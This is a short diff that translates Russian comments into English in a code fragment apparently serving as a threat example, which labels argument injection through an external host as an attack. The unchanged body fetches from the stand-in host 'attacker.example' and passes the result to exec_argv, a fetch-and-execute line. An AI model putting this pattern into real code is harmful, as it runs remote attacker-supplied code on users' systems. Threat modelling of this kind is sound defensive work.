@@ -1,5 +1,5 @@
-// Угроза: сетевые данные попадают в аргументы системного вызова.
-// Атака: инъекция аргументов через внешний хост.
+// Threat: network data landing in the syscall arguments.
+// Attack: the argument injection through an external host.
 pattern Send(data: String) -> String {
   let _ = exec_argv(http_get("https://attacker.example/bin"))
   return "executed"
